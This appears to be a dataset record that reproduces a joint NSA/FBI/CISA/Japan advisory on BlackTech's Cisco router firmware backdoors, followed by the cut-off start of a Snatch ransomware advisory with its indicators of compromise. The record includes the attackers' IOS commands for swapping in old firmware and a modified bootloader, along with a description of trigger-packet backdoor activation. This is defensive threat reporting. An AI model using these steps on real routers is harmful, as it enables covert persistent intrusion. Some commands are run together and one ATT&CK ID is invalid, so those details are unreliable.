Specifically, upon gaining an initial foothold into a target network and gaining administrator access to network edge devices, BlackTech cyber actors often modify the firmware to hide their activity across the edge devices to further maintain persistence in the network. To extend their foothold across an organization, BlackTech actors target branch routers—typically smaller appliances used at remote branch offices to connect to a corporate headquarters—and then abuse the trusted relationship [T1199] of the branch routers within the corporate network being targeted. BlackTech actors then use the compromised public-facing branch routers as part of their infrastructure for proxying traffic [TA0011], blending in with corporate network traffic, and pivoting to other victims on the same corporate network [T1090.002].
Maintaining access via stealthy router backdoors
BlackTech has targeted and exploited various brands and versions of router devices. TTPs against routers enable the actors to conceal configuration changes, hide commands, and disable logging while BlackTech actors conduct operations. BlackTech actors have compromised several Cisco® routers using variations of a customized firmware backdoor [T1542.004]. The backdoor functionality is enabled and disabled through specially crafted TCP or UDP packets [T1205]. This TTP is not solely limited to Cisco routers, and similar techniques could be used to enable backdoors in other network equipment.
In some cases, BlackTech actors replace the firmware for certain Cisco IOS®-based routers with malicious firmware. Although BlackTech actors already had elevated privileges [TA0004] on the router to replace the firmware via command-line execution, the malicious firmware is used to establish persistent backdoor access [TA0003] and obfuscate future malicious activity. The modified firmware uses a built-in SSH backdoor [T1556.004], allowing BlackTech actors to maintain access to the compromised router without BlackTech connections being logged [T1562.003]. BlackTech actors bypass the router's built-in security features by first installing older legitimate firmware [T1601.002] that they then modify in memory to allow the installation of a modified, unsigned bootloader and modified, unsigned firmware [T1601.001]. The modified bootloader enables the modified firmware to continue evading detection [T1553.006], however, it is not always necessary.
BlackTech actors may also hide their presence and obfuscate changes made to compromised Cisco routers by hiding Embedded Event Manager (EEM) policies—a feature usually used in Cisco IOS to automate tasks that execute upon specified events—that manipulate Cisco IOS Command-Line Interface (CLI) command results. On a compromised router, the BlackTech-created EEM policy waits for specific commands to execute obfuscation measures or deny execution of specified legitimate commands. This policy has two functions: (1) to remove lines containing certain strings in the output of specified, legitimate Cisco IOS CLI commands [T1562.006], and (2) prevent the execution of other legitimate CLI commands, such as hindering forensic analysis by blocking copy, rename, and move commands for the associated EEM policy [T1562.001].
Firmware replacement process
BlackTech actors utilize the following file types to compromise the router. These files are downloaded to the router via FTP or SSH.

Table 1: File types to compromise the router


File Type
Description




Old Legitimate Firmware
The IOS image firmware is modified in memory to allow installation of the Modified Firmware and Modified Bootloader.


Modified Firmware
The firmware has a built-in SSH backdoor, allowing operators to have unlogged interaction with the router.


Modified Bootloader
The bootloader allows Modified Firmware to continue evading the router's security features for persistence across reboots. In some cases, only modified firmware is used.



BlackTech actors use the Cisco router's CLI to replace the router’s IOS image firmware. The process begins with the firmware being modified in memory—also called hot patching—to allow the installation of a modified bootloader and modified firmware capable of bypassing the router’s security features. Then, a specifically constructed packet triggers the router to enable the backdoor that bypasses logging and the access control list (ACL). The steps are as follows:

Download old legitimate firmware.

Set the router to load the old legitimate firmware and reboot with the following command(s):





config tno boot system usbflash0 [filename]boot system usbflash0 [filename]endwritereload






Download the modified bootloader and modified firmware.

Set the router to load the modified firmware with the following command(s):



conf tno boot system usbflash0 [filename]boot system usbflash0 [filename]endwrite





Load the modified bootloader (the router reboots automatically) with the following command:



upgrade rom file bootloader




Enable access by sending a trigger packet that has specific values within the UDP data or TCP Sequence Number field and the Maximum Segment Size (MSS) parameter within the TCP Options field.

Modified bootloader
To allow the modified bootloader and firmware to be installed on Cisco IOS without detection, the cyber actors install an old, legitimate firmware and then modify that running firmware in memory to bypass firmware signature checks in the Cisco ROM Monitor (ROMMON) signature validation functions. The modified version’s instructions allow the actors to bypass functions of the IOS Image Load test and the Field Upgradeable ROMMON Integrity test.
Modified firmware
BlackTech actors install modified IOS image firmware that allows backdoor access via SSH to bypass the router’s normal logging functions. The firmware consists of a Cisco IOS loader that will load an embedded IOS image.
BlackTech actors hook several functions in the embedded Cisco IOS image to jump to their own code. They overwrite existing code to handle magic packet checking, implement an SSH backdoor, and bypass logging functionality on the compromised router. The modified instructions bypass command logging, IP address ACLs, and error logging.
To enable the backdoor functions, the firmware checks for incoming trigger packets and enables or disables the backdoor functionality. When the backdoor is enabled, associated logging functions on the router are bypassed. The source IP address is stored and used to bypass ACL handling for matching packets. The SSH backdoor includes a special username that does not require additional authentication.
Detection and Mitigation Techniques
In order to detect and mitigate this BlackTech malicious activity, the authoring agencies strongly recommend the following detection and mitigation techniques. It would be trivial for the BlackTech actors to modify values in their backdoors that would render specific signatures of this router backdoor obsolete. For more robust detection, network defenders should monitor network devices for unauthorized downloads of bootloaders and firmware images and reboots. Network defenders should also monitor for unusual traffic destined to the router, including SSH.
The following are the best mitigation practices to defend against this type of malicious activity:

Disable outbound connections by applying the ""transport output none"" configuration command to the virtual teletype (VTY) lines. This command will prevent some copy commands from successfully connecting to external systems.Note: An adversary with unauthorized privileged level access to a network device could revert this configuration change.[3]
Monitor both inbound and outbound connections from network devices to both external and internal systems. In general, network devices should only be connecting to nearby devices for exchanging routing or network topology information or with administrative systems for time synchronization, logging, authentication, monitoring, etc. If feasible, block unauthorized outbound connections from network devices by applying access lists or rule sets to other nearby network devices. Additionally, place administrative systems in separate virtual local area networks (VLANs) and block all unauthorized traffic from network devices destined for non-administrative VLANs.[4]
Limit access to administration services and only permit IP addresses used by network administrators by applying access lists to the VTY lines or specific services. Monitor logs for successful and unsuccessful login attempts with the ""login on-failure log"" and ""login on-success log"" configuration commands, or by reviewing centralized Authentication, Authorization, and Accounting (AAA) events.[3]
Upgrade devices to ones that have secure boot capabilities with better integrity and authenticity checks for bootloaders and firmware. In particular, highly prioritize replacing all end-of-life and unsupported equipment as soon as possible.[3],[5]
When there is a concern that a single password has been compromised, change all passwords and keys.[3]
Review logs generated by network devices and monitor for unauthorized reboots, operating system version changes, changes to the configuration, or attempts to update the firmware. Compare against expected configuration changes and patching plans to verify that the changes are authorized.[3]
Periodically perform both file and memory verification described in the Network Device Integrity (NDI) Methodology documents to detect unauthorized changes to the software stored and running on network devices.[3]
Monitor for changes to firmware. Periodically take snapshots of boot records and firmware and compare against known good images.[3]

Works Cited
[1]    Joint CSA, People’s Republic of China State-Sponsored Cyber Actors Exploit Network Providers and Devices, https://media.defense.gov/2022/Jun/07/2003013376/-1/-1/0/CSA_PRC_SPONSORED_CYBER_ACTORS_EXPLOIT_NETWORK_PROVIDERS_DEVICES_TLPWHITE.PDF[2]    Joint CSA, People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection, https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_PRC_State_Sponsored_Cyber_Living_off_the_Land_v1.1.PDF[3]    NSA, Network Infrastructure Security Guide, https://media.defense.gov/2022/Jun/15/2003018261/-1/-1/0/CTR_NSA_NETWORK_INFRASTRUCTURE_SECURITY_GUIDE_20220615.PDF[4]    NSA, Performing Out-of-Band Network Management, https://media.defense.gov/2020/Sep/17/2002499616/-1/-1/0/PERFORMING_OUT_OF_BAND_NETWORK_MANAGEMENT20200911.PDF [5]    Cisco, Attackers Continue to Target Legacy Devices, https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954
Disclaimer of endorsement
The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government or Japan, and this guidance shall not be used for advertising or product endorsement purposes.
Trademark recognition
Cisco and Cisco IOS are registered trademarks of Cisco Technology, Inc.FreeBSD is a registered trademark of The FreeBSD Foundation.Linux is a registered trademark of Linus Torvalds.MITRE and MITRE ATT&CK are registered trademarks of The MITRE Corporation.Windows is a registered trademark of Microsoft Corporation.
Purpose
This document was developed in furtherance of the authoring agencies’ cybersecurity missions, including their responsibilities to identify and disseminate cyber threats, and to develop and issue cybersecurity specifications and mitigations.
Contact
NSA Cybersecurity Report Questions and Feedback: CybersecurityReports@nsa.gov NSA’s Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov NSA Media Inquiries / Press Desk: 443-634-0721, MediaRelations@nsa.gov
U.S. organizations: Organizations can also report anomalous cyber activity and/or cyber incidents 24/7 to report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472) and/or to the FBI via your local FBI field office.
Appendix: MITRE ATT&CK Techniques
See Tables 2-9 for all referenced BlackTech tactics and techniques in this advisory.

Table 2: BlackTech ATT&CK Techniques for Enterprise – Resource Development


Technique Title
ID
Use




Obtain Capabilities: Code Signing Certificates
T1588.003
BlackTech actors use stolen code-signing certificates to sign payloads and evade defenses.




Table 3: BlackTech ATT&CK Techniques for Enterprise – Initial Access


Technique Title
ID
Use




Initial Access
TA0001
BlackTech actors gain access to victim networks by exploiting routers.


Trusted Relationship
T1199
BlackTech actors exploit trusted domain relationships of routers to gain access to victim networks.




Table 4: BlackTech ATT&CK Techniques for Enterprise – Persistence


Technique Title
ID
Use




Persistence
TA0003
BlackTech actors gain persistent access to victims’ networks.


Traffic Signaling
T1205
BlackTech actors send specially crafted packets to enable or disable backdoor functionality on a compromised router.


Pre-OS Boot: ROMMONkit
T1542.004
BlackTech actors modify router firmware to maintain persistence.




Table 5: BlackTech ATT&CK Techniques for Enterprise – Privilege Escalation


Technique Title
ID
Use




Privilege Escalation
TA0004
BlackTech actors gain elevated privileges on a victim’s network.




Table 6: BlackTech ATT&CK Techniques for Enterprise – Defense Evasion


Technique Title
ID
Use




Defense Evasion
TA0005
BlackTech actors configure their tools to evade detection by security software and EDR.


Modify Registry
T1112
BlackTech actors modify the victim’s registry.


Impair Defenses
T1562
BlackTech actors disable logging on compromised routers to avoid detection and evade defenses.


Impair Defenses: Impair Command History Logging
T1562.003
BlackTech actors disable logging on the compromised routers to prevent logging of any commands issued.


Modify System Image: Patch System Image
T1601.001
BlackTech actors modify router firmware to evade detection.




Table 7: BlackTech ATT&CK Techniques for Enterprise – Discovery


Technique Title
ID
Use




Discovery
TA0007
BlackTech actors use SNScan to enumerate victims’ networks and obtain further network information.




Table 8: BlackTech ATT&CK Techniques for Enterprise – Lateral Movement


Technique Title
ID
Use




Remote Services: Remote Desktop Protocol
T1021.001
BlackTech actors use RDP to move laterally across a victim’s network.


Remote Services: SSH
T1021.004
BlackTech actors use SSH to move laterally across a victim’s network.




Table 9: BlackTech ATT&CK Techniques for Enterprise – Command and Control


Technique Title
ID
Use




Command and Control
TA0011
BlackTech actors compromise and control a victim’s network infrastructure.


Application Layer Protocol: File Transfer Protocols
T1071.002
BlackTech actors use FTP to move data through a victim’s network or to deliver scripts for compromising routers.


Proxy
T1090
BlackTech actors use compromised routers to proxy traffic.









This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0003', 'T1588.003', 'T1090.002', 'T1562.001', 'T1071.002', 'T1542.004', 'T1553.002', 'TA0005', 'T1562', 'T1021.004', 'T1556.004', 'T1112', 'TA0011', 'T1199', 'T1562.003', 'T1090', 'TA0001', 'T20200', 'T1562.006', 'T1021.001', 'T1205', 'TA0004', 'T1601.002', 'T1601.001', 'TA0007', 'T1553.006'}","



Executive Summary
The United States National Security Agency (NSA), the U.S. Federal Bureau of Investigation (FBI), the U.S. Cybersecurity and Infrastructure Security Agency (CISA), the Japan National Police Agency (NPA), and the Japan National Center of Incident Readiness and Strategy for Cybersecurity (NISC) (hereafter referred to as the “authoring agencies”) are releasing this joint cybersecurity advisory (CSA) to detail activity of the People’s Republic of China (PRC)-linked cyber actors known as BlackTech. BlackTech has demonstrated capabilities in modifying router firmware without detection and exploiting routers’ domain-trust relationships for pivoting from international subsidiaries to headquarters in Japan and the U.S. — the primary targets. The authoring agencies recommend implementing the mitigations described to detect this activity and protect devices from the backdoors the BlackTech actors are leaving behind.
BlackTech (a.k.a. Palmerworm, Temp.Overboard, Circuit Panda, and Radio Panda) actors have targeted government, industrial, technology, media, electronics, and telecommunication sectors, including entities that support the militaries of the U.S. and Japan. BlackTech actors use custom malware, dual-use tools, and living off the land tactics, such as disabling logging on routers, to conceal their operations. This CSA details BlackTech’s tactics, techniques, and procedures (TTPs), which highlights the need for multinational corporations to review all subsidiary connections, verify access, and consider implementing Zero Trust models to limit the extent of a potential BlackTech compromise.
For more information on the risks posed by this deep level of unauthorized access, see the CSA People’s Republic of China State-Sponsored Cyber Actors Exploit Network Providers and Devices.,1,
Download the PDF version of this report: PDF, 808 KB
Technical Details
This advisory uses the MITRE® ATT&CK® for Enterprise framework, version 13.1. See the Appendix: MITRE ATT&CK Techniques for all referenced TTPs.
Background
Active since 2010, BlackTech actors have historically targeted a wide range of U.S. and East Asia public organizations and private industries. BlackTech actors’ TTPs include developing customized malware and tailored persistence mechanisms for compromising routers. These TTPs allow the actors to disable logging, and abuse trusted domain relationships, to pivot between international subsidiaries and domestic headquarters’ networks.
Observable TTPs
BlackTech cyber actors use custom malware payloads and remote access tools (RATs) to target victims’ operating systems. The actors have used a range of custom malware families targeting Windows®, Linux®, and FreeBSD® operating systems. Custom malware families employed by BlackTech include:

BendyBear,S0574,
Bifrose
BTSDoor
FakeDead (a.k.a. TSCookie),S0436,
Flagpro,S0696,
FrontShell (FakeDead’s downloader module)
IconDown
PLEAD,S0435,
SpiderPig
SpiderSpring
SpiderStack
WaterBear,S0579,

BlackTech actors continuously update these tools to evade detection, by security software. The actors also use stolen code-signing certificates, to sign the malicious payloads, which make them appear legitimate and therefore more difficult for security software to detect,.
BlackTech actors use living off the land TTPs to blend in with normal operating system and network activities, allowing them to evade detection by endpoint detection and response (EDR) products. Common methods of persistence on a host include NetCat shells, modifying the victim registry, to enable the remote desktop protocol (RDP), and secure shell (SSH),. The actors have also used SNScan for enumeration, and a local file transfer protocol (FTP) server, to move data through the victim network. For additional examples of malicious cyber actors living off the land, see People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection.,2,
Pivoting from international subsidiaries
The PRC-linked BlackTech actors target international subsidiaries of U.S. and Japanese companies. After gaining access, to the subsidiaries’ internal networks, BlackTech actors are able to pivot from the trusted internal routers to other subsidiaries of the companies and the headquarters’ networks. BlackTech actors exploit trusted network relationships between an established victim and other entities to expand their access in target networks.
Specifically, upon gaining an initial foothold into a target network and gaining administrator access to network edge devices, BlackTech cyber actors often modify the firmware to hide their activity across the edge devices to further maintain persistence in the network. To extend their foothold across an organization, BlackTech actors target branch routers—typically smaller appliances used at remote branch offices to connect to a corporate headquarters—and then abuse the trusted relationship, of the branch routers within the corporate network being targeted. BlackTech actors then use the compromised public-facing branch routers as part of their infrastructure for proxying traffic, blending in with corporate network traffic, and pivoting to other victims on the same corporate network,.
Maintaining access via stealthy router backdoors
BlackTech has targeted and exploited various brands and versions of router devices. TTPs against routers enable the actors to conceal configuration changes, hide commands, and disable logging while BlackTech actors conduct operations. BlackTech actors have compromised several Cisco® routers using variations of a customized firmware backdoor,. The backdoor functionality is enabled and disabled through specially crafted TCP or UDP packets,. This TTP is not solely limited to Cisco routers, and similar techniques could be used to enable backdoors in other network equipment.
In some cases, BlackTech actors replace the firmware for certain Cisco IOS®-based routers with malicious firmware. Although BlackTech actors already had elevated privileges, on the router to replace the firmware via command-line execution, the malicious firmware is used to establish persistent backdoor access, and obfuscate future malicious activity. The modified firmware uses a built-in SSH backdoor, allowing BlackTech actors to maintain access to the compromised router without BlackTech connections being logged,. BlackTech actors bypass the router's built-in security features by first installing older legitimate firmware, that they then modify in memory to allow the installation of a modified, unsigned bootloader and modified, unsigned firmware,. The modified bootloader enables the modified firmware to continue evading detection, however, it is not always necessary.
BlackTech actors may also hide their presence and obfuscate changes made to compromised Cisco routers by hiding Embedded Event Manager (EEM) policies—a feature usually used in Cisco IOS to automate tasks that execute upon specified events—that manipulate Cisco IOS Command-Line Interface (CLI) command results. On a compromised router, the BlackTech-created EEM policy waits for specific commands to execute obfuscation measures or deny execution of specified legitimate commands. This policy has two functions: (1) to remove lines containing certain strings in the output of specified, legitimate Cisco IOS CLI commands, and (2) prevent the execution of other legitimate CLI commands, such as hindering forensic analysis by blocking copy, rename, and move commands for the associated EEM policy,.
Firmware replacement process
BlackTech actors utilize the following file types to compromise the router. These files are downloaded to the router via FTP or SSH.

BlackTech actors use the Cisco router's CLI to replace the router’s IOS image firmware. The process begins with the firmware being modified in memory—also called hot patching—to allow the installation of a modified bootloader and modified firmware capable of bypassing the router’s security features. Then, a specifically constructed packet triggers the router to enable the backdoor that bypasses logging and the access control list (ACL). The steps are as follows:

Download old legitimate firmware.

Set the router to load the old legitimate firmware and reboot with the following command(s):


Download the modified bootloader and modified firmware.

Set the router to load the modified firmware with the following command(s):



Load the modified bootloader (the router reboots automatically) with the following command:


Enable access by sending a trigger packet that has specific values within the UDP data or TCP Sequence Number field and the Maximum Segment Size (MSS) parameter within the TCP Options field.

Modified bootloader
To allow the modified bootloader and firmware to be installed on Cisco IOS without detection, the cyber actors install an old, legitimate firmware and then modify that running firmware in memory to bypass firmware signature checks in the Cisco ROM Monitor (ROMMON) signature validation functions. The modified version’s instructions allow the actors to bypass functions of the IOS Image Load test and the Field Upgradeable ROMMON Integrity test.
Modified firmware
BlackTech actors install modified IOS image firmware that allows backdoor access via SSH to bypass the router’s normal logging functions. The firmware consists of a Cisco IOS loader that will load an embedded IOS image.
BlackTech actors hook several functions in the embedded Cisco IOS image to jump to their own code. They overwrite existing code to handle magic packet checking, implement an SSH backdoor, and bypass logging functionality on the compromised router. The modified instructions bypass command logging, IP address ACLs, and error logging.
To enable the backdoor functions, the firmware checks for incoming trigger packets and enables or disables the backdoor functionality. When the backdoor is enabled, associated logging functions on the router are bypassed. The source IP address is stored and used to bypass ACL handling for matching packets. The SSH backdoor includes a special username that does not require additional authentication.
Detection and Mitigation Techniques
In order to detect and mitigate this BlackTech malicious activity, the authoring agencies strongly recommend the following detection and mitigation techniques. It would be trivial for the BlackTech actors to modify values in their backdoors that would render specific signatures of this router backdoor obsolete. For more robust detection, network defenders should monitor network devices for unauthorized downloads of bootloaders and firmware images and reboots. Network defenders should also monitor for unusual traffic destined to the router, including SSH.
The following are the best mitigation practices to defend against this type of malicious activity:

Disable outbound connections by applying the ""transport output none"" configuration command to the virtual teletype (VTY) lines. This command will prevent some copy commands from successfully connecting to external systems.Note: An adversary with unauthorized privileged level access to a network device could revert this configuration change.,3,
Monitor both inbound and outbound connections from network devices to both external and internal systems. In general, network devices should only be connecting to nearby devices for exchanging routing or network topology information or with administrative systems for time synchronization, logging, authentication, monitoring, etc. If feasible, block unauthorized outbound connections from network devices by applying access lists or rule sets to other nearby network devices. Additionally, place administrative systems in separate virtual local area networks (VLANs) and block all unauthorized traffic from network devices destined for non-administrative VLANs.,4,
Limit access to administration services and only permit IP addresses used by network administrators by applying access lists to the VTY lines or specific services. Monitor logs for successful and unsuccessful login attempts with the ""login on-failure log"" and ""login on-success log"" configuration commands, or by reviewing centralized Authentication, Authorization, and Accounting (AAA) events.,3,
Upgrade devices to ones that have secure boot capabilities with better integrity and authenticity checks for bootloaders and firmware. In particular, highly prioritize replacing all end-of-life and unsupported equipment as soon as possible.,3,5,
When there is a concern that a single password has been compromised, change all passwords and keys.,3,
Review logs generated by network devices and monitor for unauthorized reboots, operating system version changes, changes to the configuration, or attempts to update the firmware. Compare against expected configuration changes and patching plans to verify that the changes are authorized.,3,
Periodically perform both file and memory verification described in the Network Device Integrity (NDI) Methodology documents to detect unauthorized changes to the software stored and running on network devices.,3,
Monitor for changes to firmware. Periodically take snapshots of boot records and firmware and compare against known good images.,3,

Works Cited,1,    Joint CSA, People’s Republic of China State-Sponsored Cyber Actors Exploit Network Providers and Devices, https://media.defense.gov/2022/Jun/07/2003013376/-1/-1/0/CSA_PRC_SPONSORED_CYBER_ACTORS_EXPLOIT_NETWORK_PROVIDERS_DEVICES_TLPWHITE.PDF,2,    Joint CSA, People's Republic of China State-Sponsored Cyber Actor Living off the Land to Evade Detection, https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_PRC_State_Sponsored_Cyber_Living_off_the_Land_v1.1.PDF,3,    NSA, Network Infrastructure Security Guide, https://media.defense.gov/2022/Jun/15/2003018261/-1/-1/0/CTR_NSA_NETWORK_INFRASTRUCTURE_SECURITY_GUIDE_20220615.PDF,4,    NSA, Performing Out-of-Band Network Management, https://media.defense.gov/2020/Sep/17/2002499616/-1/-1/0/PERFORMING_OUT_OF_BAND_NETWORK_MANAGEMENT20200911.PDF,5,    Cisco, Attackers Continue to Target Legacy Devices, https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954
Disclaimer of endorsement
The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government or Japan, and this guidance shall not be used for advertising or product endorsement purposes.
Trademark recognition
Cisco and Cisco IOS are registered trademarks of Cisco Technology, Inc.FreeBSD is a registered trademark of The FreeBSD Foundation.Linux is a registered trademark of Linus Torvalds.MITRE and MITRE ATT&CK are registered trademarks of The MITRE Corporation.Windows is a registered trademark of Microsoft Corporation.
Purpose
This document was developed in furtherance of the authoring agencies’ cybersecurity missions, including their responsibilities to identify and disseminate cyber threats, and to develop and issue cybersecurity specifications and mitigations.
Contact
NSA Cybersecurity Report Questions and Feedback: CybersecurityReports@nsa.gov NSA’s Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov NSA Media Inquiries / Press Desk: 443-634-0721, MediaRelations@nsa.gov
U.S. organizations: Organizations can also report anomalous cyber activity and/or cyber incidents 24/7 to report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472) and/or to the FBI via your local FBI field office.
Appendix: MITRE ATT&CK Techniques
See Tables 2-9 for all referenced BlackTech tactics and techniques in this advisory.














This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-270a
18,"






Actions to take today to mitigate malicious cyber activity:




Secure and closely monitor Remote Desktop Protocol (RDP).
Maintain offline backups of data.
Enable and enforce phishing-resistant multifactor authentication (MFA).







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known ransomware IOCs and TTPs associated with the Snatch ransomware variant identified through FBI investigations as recently as June 1, 2023.
Since mid-2021, Snatch threat actors have consistently evolved their tactics to take advantage of current trends in the cybercriminal space and leveraged successes of other ransomware variants’ operations. Snatch threat actors have targeted a wide range of critical infrastructure sectors including the Defense Industrial Base (DIB), Food and Agriculture, and Information Technology sectors. Snatch threat actors conduct ransomware operations involving data exfiltration and double extortion. After data exfiltration often involving direct communications with victims demanding ransom, Snatch threat actors may threaten victims with double extortion, where the victims’ data will be posted on Snatch’s extortion blog if the ransom goes unpaid.
FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.
Download the PDF version of this report:


AA23-263A.pdf
(PDF,       578.71 KB
  )


For a downloadable copy of IOCs, see:


AA23-263A STIX XML
(XML,       79.84 KB
  )




AA23-263A STIX JSON
(JSON,       56.10 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 13. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
First appearing in 2018, Snatch operates a ransomware-as-a-service (RaaS) model and claimed their first U.S.-based victim in 2019. Originally, the group was referred to as Team Truniger, based on the nickname of a key group member, Truniger, who previously operated as a GandCrab affiliate. Snatch threat actors use a customized ransomware variant notable for rebooting devices into Safe Mode [T1562.009], enabling the ransomware to circumvent detection by antivirus or endpoint protection, and then encrypting files when few services are running.
Snatch threat actors have been observed purchasing previously stolen data from other ransomware variants in an attempt to further exploit victims into paying a ransom to avoid having their data released on Snatch’s extortion blog. Note: Since November 2021, an extortion site operating under the name Snatch served as a clearinghouse for data exfiltrated or stolen from victim companies on Clearnet and TOR hosted by a bulletproof hosting service. In August 2023, individuals claiming to be associated with the blog gave a media interview claiming the blog was not associated with Snatch ransomware and “none of our targets has been attacked by Ransomware Snatch…”, despite multiple confirmed Snatch victims’ data appearing on the blog alongside victims associated with other ransomware groups, notably Nokoyawa and Conti.[1]
Initial Access and Persistence
Snatch threat actors employ several different methods to gain access to and maintain persistence on a victim’s network. Snatch affiliates primarily rely on exploiting weaknesses in Remote Desktop Protocol (RDP) [T1133] for brute-forcing and gaining administrator credentials to victims’ networks [T1110.001]. In some instances, Snatch affiliates have sought out compromised credentials from criminal forums/marketplaces [T1078].
Snatch threat actors gain persistence on a victim’s network by compromising an administrator account [T1078.002] and establishing connections over port 443 [T1071.001] to a command and control (C2) server located on a Russian bulletproof hosting service [T1583.003]. Per IP traffic from event logs provided by recent victims, Snatch threat actors initiated RDP connections from a Russian bulletproof hosting service and through other virtual private network (VPN) services [T1133].
Data Discovery and Lateral Movement
Snatch threat actors were observed using different TTPs to discover data, move laterally, and search for data to exfiltrate. Snatch threat actors use sc.exe to configure, query, stop, start, delete, and add system services using the Windows Command line. In addition to sc.exe, Snatch threat actors also use tools such as Metasploit and Cobalt Strike [S0154].
Prior to deploying the ransomware, Snatch threat actors were observed spending up to three months on a victim’s system. Within this timeframe, Snatch threat actors exploited the victim’s network [T1590], moving laterally across the victim’s network with RDP [T1021.001] for the largest possible deployment of ransomware and searching for files and folders [T1005] for data exfiltration [TA0010] followed by file encryption [T1486].
Defense Evasion and Execution
During the early stages of ransomware deployment, Snatch threat actors attempt to disable antivirus software [T1562.001] and run an executable as a file named safe.exe or some variation thereof. In recent victims, the ransomware executable’s name consisted of a string of hexadecimal characters which match the SHA-256 hash of the file in an effort to defeat rule-based detection [T1036]. Upon initiation, the Snatch ransomware payload queries and modifies registry keys [T1012][T1112], uses various native Windows tools to enumerate the system [T1569.002], finds processes [T1057], and creates benign processes to execute Windows batch (.bat) files [T1059.003]. In some instances, the program attempts to remove all the volume shadow copies from a system [T1490]. After the execution of the batch files, the executable removes the batch files from the victim’s filesystem [T1070.004].
The Snatch ransomware executable appends a series of hexadecimal characters to each file and folder name it encrypts—unique to each infection—and leaves behind a text file titled HOW TO RESTORE YOUR FILES.TXT in each folder. Snatch threat actors communicate with their victims through email and the Tox communication platform based on identifiers left in ransom notes or through their extortion blog. Since November 2021, some victims reported receiving a spoofed call from an unknown female who claimed association with Snatch and directed them to the group’s extortion site. In some instances, Snatch victims had a different ransomware variant deployed on their systems, but received a ransom note from Snatch threat actors. As a result, the victims’ data is posted on the ransomware blog involving the different ransomware variant and on the Snatch threat actors’ extortion blog.
Indicators of Compromise (IOCs)
The Snatch IOCs detailed in this section were obtained through FBI investigations from September 2022 through June 2023.
Email Domains and Addresses
Since 2019, Snatch threat actors have used numerous email addresses to email victims. Email addresses used by Snatch threat actors are random but usually originate from one of the following domains listed in Tables 1 and 2:

Table 1: Malicious Email Domains Observed in Use by Snatch Threat Actors


Email Domains




sezname[.]cz


cock[.]li


airmail[.]cc



Table 2 shows a list of legitimate email domains offering encrypted email services that have been used by Snatch threat actors. These email domains are all publicly available and legal. The use of these email domains by a threat actor should not be attributed to the email domains, absent specific articulable facts tending to show they are used at the direction or under the control of a threat actor.

Table 2: Legitimate Email Domains Observed in Use by Snatch Threat Actors


Email Domains




tutanota[.]com / tutamail[.]com / tuta[.]io


mail[.]fr


keemail[.]me


protonmail[.]com / proton[.]me


swisscows[.]email



The email addresses listed in Table 3 were reported by recent victims.

Table 3: Snatch’s Email Addresses Reported by Recent Victims


Email Addresses




sn.tchnews.top@protonmail[.]me


funny385@swisscows[.]email


funny385@proton[.]me


russellrspeck@seznam[.]cz


russellrspeck@protonmail[.]com


Mailz13MoraleS@proton[.]me


datasto100@tutanota[.]com


snatch.vip@protonmail[.]com




TOX Messaging IDs


TOX Messaging IDs




CAB3D74D1DADE95B52928E4D9DFC003FF5ADB2E082F59377D049A91952E8BB3B419DB2FA9D3F


7229828E766B9058D329B2B4BC0EDDD11612CBCCFA4811532CABC76ACF703074E0D1501F8418


83E6E3CFEC0E4C8E7F7B6E01F6E86CF70AE8D4E75A59126A2C52FE9F568B4072CA78EF2B3C97



0FF26770BFAEAD95194506E6970CC1C395B04159038D785DE316F05CE6DE67324C6038727A58
NOTE: According to ransom notes, this is a “Customer service” TOX to reach out to if the original TOX ID does not respond.





Folder Creation


Folder Creation




C:\$SysReset




Filenames with Associated SHA-256 Hashes


Filenames
SHA-256




qesbdksdvnotrjnexutx.bat
0965cb8ee38adedd9ba06bdad9220a35890c2df0e4c78d0559cd6da653bf740f


eqbglqcngblqnl.bat
1fbdb97893d09d59575c3ef95df3c929fe6b6ddf1b273283e4efadf94cdc802d


safe.exe
5950b4e27554585123d7fca44e83169375c6001201e3bf26e57d079437e70bcd


safe.exe
7018240d67fd11847c7f9737eaaae45794b37a5c27ffd02beaacaf6ae13352b3


safe.exe
28e82f28d0b9eb6a53d22983e21a9505ada925ebb61382fabebd76b8c4acff7c


safe.exe
fc31043b5f079ce88385883668eeebba76a62f77954a960fb03bf46f47dbb066


DefenderControl.exe
a201f7f81277e28c0bdd680427b979aee70e42e8a98c67f11e7c83d02f8fe7ae


PRETTYOCEANApplicationdrs.bi
6992aaad3c47b938309fc1e6f37179eb51f028536f8afc02e4986312e29220c0


Setup.exe
